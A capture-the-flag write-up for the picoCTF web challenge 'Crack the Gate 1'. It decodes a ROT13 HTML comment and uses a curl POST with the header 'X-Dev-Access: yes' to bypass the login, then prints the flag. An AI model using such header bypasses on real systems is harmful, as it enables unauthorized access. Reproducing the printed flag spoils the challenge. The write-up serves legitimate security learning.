# Crack the Gate 1 — picoCTF

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF (picoMini by CMU-Africa)  

---

## Challenge Description

> We're in the middle of an investigation. One of our persons of interest is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email: `ctf-player@picoctf.org`. Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off — it's almost like the developer left a secret way in.

---

## Tools Used

- Browser DevTools (View Source)
- ROT13 decoder
- `curl` (command line HTTP requests)

---

## Solution

### Step 1 — Launch the instance and view page source

Opened the challenge website and pressed `Ctrl+U` to view the HTML source code.

Found two hidden comments:

```html
<!-- ABGr: Wnpx olcnff: hfr urnqre "K-Qri-Nprff: lrf" -->
<!-- Remove before pushing to production! -->
```

The hint section also revealed: *"A common trick is to rotate each letter by 13 positions in the alphabet."* — this is **ROT13**.

### Step 2 — Decode the ROT13 comment

```python
import codecs
encoded = 'ABGr: Wnpx olcnff: hfr urnqre "K-Qri-Nprff: lrf"'
decoded = codecs.decode(encoded, 'rot13')
print(decoded)
# Output: NOTe: Jack bypass: use header "X-Dev-Access: yes"
```

This revealed a hidden developer backdoor: sending the HTTP header `X-Dev-Access: yes` bypasses the login.

### Step 3 — Send the request with the custom header

Used `curl` in the picoCTF webshell to send a POST request to `/login` with the bypass header:

```bash
curl -X POST http://amiable-citadel.picoctf.net:53954/login \
  -H "X-Dev-Access: yes" \
  -d "email=ctf-player@picoctf.org&password=test"
```

**Response:**
```json
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_f0rc4_83812a02}"
}
```

---

## Flag

```
picoCTF{brut4_f0rc4_83812a02}
```

---

## What I Learned

- Developers sometimes leave debug backdoors in production code
- HTML comments can reveal sensitive implementation details
- ROT13 is a simple substitution cipher (shift of 13) often used in CTFs
- Custom HTTP headers can be used to bypass authentication controls
- Always check page source and HTTP headers when testing web applications
